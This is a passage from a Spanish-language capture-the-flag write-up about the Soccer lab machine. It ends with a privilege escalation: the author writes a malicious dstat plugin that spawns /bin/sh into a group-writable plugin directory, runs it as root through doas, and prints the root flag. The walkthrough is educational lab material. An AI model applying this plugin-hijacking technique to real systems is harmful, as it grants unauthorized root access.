+  -d, --disk               enable disk stats
+     -D total,hda             include hda and total
+  -g, --page               enable page stats
+  -i, --int                enable interrupt stats
+     -I 5,eth2                include int5 and interrupt used by eth2
+  -l, --load               enable load stats
+  -m, --mem                enable memory stats
+  -n, --net                enable network stats
+     -N eth1,total            include eth1 and total
+  -p, --proc               enable process stats
+  -r, --io                 enable io stats (I/O requests completed)
+  -s, --swap               enable swap stats
+     -S swap1,total           include swap1 and total
+  -t, --time               enable time/date output
+  -T, --epoch              enable time counter (seconds since epoch)
+  -y, --sys                enable system stats
+
+  --aio                    enable aio stats
+  --fs, --filesystem       enable fs stats
+  --ipc                    enable ipc stats
+  --lock                   enable lock stats
+  --raw                    enable raw stats
+  --socket                 enable socket stats
+  --tcp                    enable tcp stats
+  --udp                    enable udp stats
+  --unix                   enable unix stats
+  --vm                     enable vm stats
+  --vm-adv                 enable advanced vm stats
+  --zones                  enable zoneinfo stats
+
+  --list                   list all available plugins
+  --&lt;plugin-name&gt;          enable external plugin by name (see --list)
+
+  -a, --all                equals -cdngy (default)
+  -f, --full               automatically expand -C, -D, -I, -N and -S lists
+  -v, --vmstat             equals -pmgdsc -D total
+
+  --bits                   force bits for values expressed in bytes
+  --float                  force float values on screen
+  --integer                force integer values on screen
+
+  --bw, --black-on-white   change colors for white background terminal
+  --color                  force colors
+  --nocolor                disable colors
+  --noheaders              disable repetitive headers
+  --noupdate               disable intermediate updates
+  --output file            write CSV output to file
+  --profile                show profiling statistics when exiting dstat
+
+delay is the delay in seconds between each update (default: 1)
+count is the number of updates to display before exiting (default: unlimited)  
+</code></pre></div><p>Ninguna de ellas parece darnos una forma de ejecutar comandos de sistema o código Python. La opción más interesante es <code>-&lt;plugin></code>. Usando <code>--list</code> podemos ver qué <em>plugins</em> están habilitados:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-green">player@soccer</span>:<span class="code-blue">~</span>$ dstat --list
+internal:
+        aio,cpu,cpu-adv,cpu-use,cpu24,disk,disk24,disk24-old,epoch,fs,int,int24,io,ipc,load,lock,mem,mem-adv,net,page,page24,proc,raw,
+        socket,swap,swap-old,sys,tcp,time,udp,unix,vm,vm-adv,zones
+/usr/share/dstat:
+        battery,battery-remain,condor-queue,cpufreq,dbus,disk-avgqu,disk-avgrq,disk-svctm,disk-tps,disk-util,disk-wait,dstat,dstat-cpu,
+        dstat-ctxt,dstat-mem,fan,freespace,fuse,gpfs,gpfs-ops,helloworld,ib,innodb-buffer,innodb-io,innodb-ops,jvm-full,jvm-vm,lustre,
+        md-status,memcache-hits,mongodb-conn,mongodb-mem,mongodb-opcount,mongodb-queue,mongodb-stats,mysql-io,mysql-keys,mysql5-cmds,mysql5-conn,  
+        mysql5-innodb,mysql5-innodb-basic,mysql5-innodb-extra,mysql5-io,mysql5-keys,net-packets,nfs3,nfs3-ops,nfsd3,nfsd3-ops,nfsd4-ops,nfsstat4,
+        ntp,postfix,power,proc-count,qmail,redis,rpc,rpcd,sendmail,snmp-cpu,snmp-load,snmp-mem,snmp-net,snmp-net-err,snmp-sys,snooze,squid,
+        test,thermal,top-bio,top-bio-adv,top-childwait,top-cpu,top-cpu-adv,top-cputime,top-cputime-avg,top-int,top-io,top-io-adv,top-latency,
+        top-latency-avg,top-mem,top-oom,utmp,vm-cpu,vm-mem,vm-mem-adv,vmk-hba,vmk-int,vmk-nic,vz-cpu,vz-io,vz-ubc,wifi,zfs-arc,zfs-l2arc,
+        zfs-zil
+</code></pre></div><p>Parece que todos los <em>plugins</em> se almacenan en <code>/usr/share/dstat</code>:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-green">player@soccer</span>:<span class="code-blue">~</span>$ ls /usr/share/dstat
+<span class="code-blue">__pycache__</span>              dstat_fan.py            dstat_mongodb_opcount.py      dstat_nfsd4_ops.py     dstat_snooze.py           dstat_top_oom.py
+<span class="code-green">dstat.py</span>                 dstat_freespace.py      dstat_mongodb_queue.py        dstat_nfsstat4.py      dstat_squid.py            dstat_utmp.py
+dstat_battery.py         dstat_fuse.py           dstat_mongodb_stats.py        dstat_ntp.py           dstat_test.py             dstat_vm_cpu.py
+dstat_battery_remain.py  dstat_gpfs.py           dstat_mysql5_cmds.py          dstat_postfix.py       dstat_thermal.py          dstat_vm_mem.py
+dstat_condor_queue.py    dstat_gpfs_ops.py       dstat_mysql5_conn.py          dstat_power.py         dstat_top_bio.py          dstat_vm_mem_adv.py  
+dstat_cpufreq.py         dstat_helloworld.py     dstat_mysql5_innodb.py        dstat_proc_count.py    dstat_top_bio_adv.py      dstat_vmk_hba.py
+dstat_dbus.py            dstat_ib.py             dstat_mysql5_innodb_basic.py  dstat_qmail.py         dstat_top_childwait.py    dstat_vmk_int.py
+dstat_disk_avgqu.py      dstat_innodb_buffer.py  dstat_mysql5_innodb_extra.py  dstat_redis.py         dstat_top_cpu.py          dstat_vmk_nic.py
+dstat_disk_avgrq.py      dstat_innodb_io.py      dstat_mysql5_io.py            dstat_rpc.py           dstat_top_cpu_adv.py      dstat_vz_cpu.py
+dstat_disk_svctm.py      dstat_innodb_ops.py     dstat_mysql5_keys.py          dstat_rpcd.py          dstat_top_cputime.py      dstat_vz_io.py
+dstat_disk_tps.py        dstat_jvm_full.py       dstat_mysql_io.py             dstat_sendmail.py      dstat_top_cputime_avg.py  dstat_vz_ubc.py
+dstat_disk_util.py       dstat_jvm_vm.py         dstat_mysql_keys.py           dstat_snmp_cpu.py      dstat_top_int.py          dstat_wifi.py
+dstat_disk_wait.py       dstat_lustre.py         dstat_net_packets.py          dstat_snmp_load.py     dstat_top_io.py           dstat_zfs_arc.py
+dstat_dstat.py           dstat_md_status.py      dstat_nfs3.py                 dstat_snmp_mem.py      dstat_top_io_adv.py       dstat_zfs_l2arc.py
+dstat_dstat_cpu.py       dstat_memcache_hits.py  dstat_nfs3_ops.py             dstat_snmp_net.py      dstat_top_latency.py      dstat_zfs_zil.py
+dstat_dstat_ctxt.py      dstat_mongodb_conn.py   dstat_nfsd3.py                dstat_snmp_net_err.py  dstat_top_latency_avg.py
+dstat_dstat_mem.py       dstat_mongodb_mem.py    dstat_nfsd3_ops.py            dstat_snmp_sys.py      dstat_top_mem.py
+</code></pre></div><p>En efecto, todos son <em>scripts</em> de Python con un nombre de archivo como <code>dstat_&lt;plugin>.py</code>.</p><p>Si echamos un vistazo al <a href="https://github.com/dstat-real/dstat/blob/master/dstat">código fuente en GitHub</a>, veremos que hay una lista de rutas de <em>plugins</em> válidas:</p><p><img src="/images/HTB/Soccer/Soccer-18.webp" alt="Soccer 18"></p><p>Por suerte, tenemos permisos de escritura en <code>/usr/local/share/dstat</code> como miembros del grupo <code>player</code>:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-green">player@soccer</span>:<span class="code-blue">~</span>$ ls -la /usr/local/share
+total 24
+drwxr-xr-x  6 root root   4096 Nov 17 09:16 <span class="code-blue">.</span>
+drwxr-xr-x 10 root root   4096 Nov 15 21:38 <span class="code-blue">..</span>
+drwxr-xr-x  2 root root   4096 Nov 15 21:39 <span class="code-blue">ca-certificates</span>  
+drwxrwx---  2 root player 4096 Feb  9 12:15 <span class="code-blue">dstat</span>
+drwxrwsr-x  2 root staff  4096 Nov 17 08:06 <span class="code-blue">fonts</span>
+drwxr-xr-x  5 root root   4096 Nov 17 09:09 <span class="code-blue">man</span>
+<span class="code-green">player@soccer</span>:<span class="code-blue">~</span>$ id
+uid=1001(player) gid=1001(player) groups=1001(player)
+</code></pre></div><h2 id="escalada-de-privilegios">Escalada de privilegios</h2><p>Entonces, ya que podemos ejecutar <code>dstat</code> como <code>root</code> usando <code>doas</code>, vamos a crear un <em>plugin</em> en <code>/usr/local/share/dstat</code> que ejecute <code>/bin/sh</code> a nivel de sistema:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-green">player@soccer</span>:<span class="code-blue">~</span>$ cat &gt; /usr/local/share/dstat/dstat_privesc.py
+import os
+os.system('/bin/sh')
+^C
+<span class="code-green">player@soccer</span>:<span class="code-blue">~</span>$ doas /usr/bin/dstat --list
+internal:
+        aio,cpu,cpu-adv,cpu-use,cpu24,disk,disk24,disk24-old,epoch,fs,int,int24,io,ipc,load,lock,mem,mem-adv,net,page,page24,proc,raw,
+        socket,swap,swap-old,sys,tcp,time,udp,unix,vm,vm-adv,zones
+/usr/share/dstat:
+        battery,battery-remain,condor-queue,cpufreq,dbus,disk-avgqu,disk-avgrq,disk-svctm,disk-tps,disk-util,disk-wait,dstat,dstat-cpu,
+        dstat-ctxt,dstat-mem,fan,freespace,fuse,gpfs,gpfs-ops,helloworld,ib,innodb-buffer,innodb-io,innodb-ops,jvm-full,jvm-vm,lustre,
+        md-status,memcache-hits,mongodb-conn,mongodb-mem,mongodb-opcount,mongodb-queue,mongodb-stats,mysql-io,mysql-keys,mysql5-cmds,mysql5-conn,  
+        mysql5-innodb,mysql5-innodb-basic,mysql5-innodb-extra,mysql5-io,mysql5-keys,net-packets,nfs3,nfs3-ops,nfsd3,nfsd3-ops,nfsd4-ops,nfsstat4,
+        ntp,postfix,power,proc-count,qmail,redis,rpc,rpcd,sendmail,snmp-cpu,snmp-load,snmp-mem,snmp-net,snmp-net-err,snmp-sys,snooze,squid,
+        test,thermal,top-bio,top-bio-adv,top-childwait,top-cpu,top-cpu-adv,top-cputime,top-cputime-avg,top-int,top-io,top-io-adv,top-latency,
+        top-latency-avg,top-mem,top-oom,utmp,vm-cpu,vm-mem,vm-mem-adv,vmk-hba,vmk-int,vmk-nic,vz-cpu,vz-io,vz-ubc,wifi,zfs-arc,zfs-l2arc,
+        zfs-zil
+/usr/local/share/dstat:
+        privesc
+</code></pre></div><p>Obsérvese que el nombre del archivo debe coincidir con el patrón de <em>plugin</em>; de lo contrario, el <em>plugin</em> no se mostraría. Luego, podemos cargar este <em>plugin</em> llamado <code>privesc</code> y obtendremos uns <em>shell</em> como<code> root</code>, y así leer la <em>flag</em> <code>root.txt</code>:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-green">player@soccer</span>:<span class="code-blue">~</span>$ doas /usr/bin/dstat --privesc
+/usr/bin/dstat:2619: DeprecationWarning: the imp module is deprecated in favour of importlib; see the module's documentation for alternative uses  
+  import imp
+# whoami
+root
+# cat /root/root.txt
+90d2ad373491dfbb45383cbb3acc44d5
+</code></pre></div><div class="mt6 instapaper_ignoref"></div></div><aside aria-label="aside" class="w-20-l mt6-l aside-desktop"><div class="bg-card pa3 nested-list-reset nested-copy-line-height nested-links" style="position:sticky;top:5rem;padding-bottom:0"><p class="f5 b pb2" style="border-bottom:5px solid var(--background);margin:0">Contenidos</p><nav id="TableOfContents"><ul><li><a href="#escaneo-de-puertos">Escaneo de puertos</a></li><li><a href="#enumeración">Enumeración</a><ul><li><a href="#explotación-de-subida-de-archivos">Explotación de subida de archivos</a></li><li><a href="#encontrando-otro-subdominio">Encontrando otro subdominio</a></li></ul></li><li><a href="#explotación-de-sqli">Explotación de SQLi</a><ul><li><a href="#uso-de-sqlmap">Uso de <code>sqlmap</code></a></li><li><a href="#_exploit_-personalizado"><em>Exploit</em> personalizado</a></li></ul></li><li><a href="#acceso-a-la-máquina">Acceso a la máquina</a></li><li><a href="#enumeración-del-sistema">Enumeración del sistema</a></li><li><a href="#escalada-de-privilegios">Escalada de privilegios</a></li></ul></nav><div class="bg-card" style="border-top:5px solid var(--background)"><a class="bmc-btn w-100" target="_blank" href="http://buymeacoffee.com/7Rocky" style="padding:0" title="Buy me a beer">🍺 <span class="bmc-btn-text" style="font-family:Cookie!important;color:#fff">Buy me a beer</span></a></div></div></aside></article></main><footer class="bottom-0 w-100" role="contentinfo"><div class="tc mw8 ph3" style="margin:auto"><form style="background-color:var(--background-card)" class="tc mw8 pv3 mb3" action="https://tinyletter.com/7Rocky" method="post" target="popupwindow" onsubmit='return window.open("https://tinyletter.com/7Rocky","popupwindow","scrollbars=yes,width=800,height=600"),!0'><h3 class="tc">Recibe un resumen semanal del blog</h3><p class="tc"><label for="tlemail"></label></p><p class="tc"><input type="text" class="w-80 f5 pv3 ph3 bg-light-gray bn search" placeholder="Introduce tu correo electrónico" name="email" id="tlemail">
+<input class="f5 pv3 ph3 bn" style="background-color:var(--background);color:inherit;font-weight:700;line-height:normal" type="submit" value="Submit"></p><input type="hidden" value="1" name="embed">
+<input style="display:none;color:var(--header)" type="submit" value="Suscribirse"><p class="tc">impulsado por <a href="https://tinyletter.com" target="_blank" title="TinyLetter">TinyLetter</a></p><p class="tc"><a href="/en/newsletters/" target="_blank" title="View letter archive">View letter archive</a></p></form></div><div class="bg-black w-100 pa3" role="contentinfo"><div class="flex justify-between"><a class="f4 fw4 hover-white no-underline white-70 dn dib-ns pv2 ph3" href="https://7rocky.github.io/" title="https://7rocky.github.io/">&copy; Blog de 7Rocky. Ciberseguridad y Mates 2023</a><div style="margin-top:8px"><div><div><a href="https://www.linkedin.com/in/roberto-gesteira-minarro/" target="_blank" class="link-transition linkedin link dib z-999 pt3 pt0-l mr1" title="LinkedIn link" rel="noopener" aria-label="follow on LinkedIn——Opens in a new window"><svg height="30" style="enable-background:new 0 0 65 65" viewBox="0 0 65 65" width="30" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M50.837 48.137V36.425c0-6.275-3.35-9.195-7.816-9.195-3.604.0-5.219 1.983-6.119 3.374V27.71h-6.79c.09 1.917.0 20.427.0 20.427h6.79V36.729c0-.609.044-1.219.224-1.655.49-1.22 1.607-2.483 3.482-2.483 2.458.0 3.44 1.873 3.44 4.618v10.929H50.837zM22.959 24.922c2.367.0 3.842-1.57 3.842-3.531-.044-2.003-1.475-3.528-3.797-3.528s-3.841 1.524-3.841 3.528c0 1.961 1.474 3.531 3.753 3.531H22.959zM34 64C17.432 64 4 50.568 4 34 4 17.431 17.432 4 34 4s30 13.431 30 30c0 16.568-13.432 30-30 30zM26.354 48.137V27.71h-6.789v20.427h6.789z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg><span class="new-window"><svg height="8" style="enable-background:new 0 0 1000 1000" viewBox="0 0 1e3 1e3" width="8" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M598 128h298v298h-86V274L392 692l-60-60 418-418H598v-86zM810 810V512h86v298c0 46-40 86-86 86H214c-48 0-86-40-86-86V214c0-46 38-86 86-86h298v86H214v596h596z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg></span></a><a href="https://github.com/7Rocky" target="_blank" class="link-transition github link dib z-999 pt3 pt0-l mr1" title="GitHub link" rel="noopener" aria-label="follow on GitHub——Opens in a new window"><svg height="30" style="enable-background:new 0 0 512 512" viewBox="0 0 512 512" width="30" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M256 32C132.3 32 32 134.8 32 261.7c0 101.5 64.2 187.5 153.2 217.9 11.2 2.1 15.3-5 15.3-11.1.0-5.5-.2-19.9-.3-39.1-62.3 13.9-75.5-30.8-75.5-30.8-10.2-26.5-24.9-33.6-24.9-33.6-20.3-14.3 1.5-14 1.5-14 22.5 1.6 34.3 23.7 34.3 23.7 20 35.1 52.4 25 65.2 19.1 2-14.8 7.8-25 14.2-30.7-49.7-5.8-102-25.5-102-113.5.0-25.1 8.7-45.6 23-61.6-2.3-5.8-10-29.2 2.2-60.8.0.0 18.8-6.2 61.6 23.5 17.9-5.1 37-7.6 56.1-7.7 19 .1 38.2 2.6 56.1 7.7 42.8-29.7 61.5-23.5 61.5-23.5 12.2 31.6 4.5 55 2.2 60.8 14.3 16.1 23 36.6 23 61.6.0 88.2-52.4 107.6-102.3 113.3 8 7.1 15.2 21.1 15.2 42.5.0 30.7-.3 55.5-.3 63 0 6.1 4 13.3 15.4 11C415.9 449.1 480 363.1 480 261.7 480 134.8 379.7 32 256 32z"/></svg><span class="new-window"><svg height="8" style="enable-background:new 0 0 1000 1000" viewBox="0 0 1e3 1e3" width="8" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M598 128h298v298h-86V274L392 692l-60-60 418-418H598v-86zM810 810V512h86v298c0 46-40 86-86 86H214c-48 0-86-40-86-86V214c0-46 38-86 86-86h298v86H214v596h596z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg></span></a></div></div></div></div></div></footer></body></html>
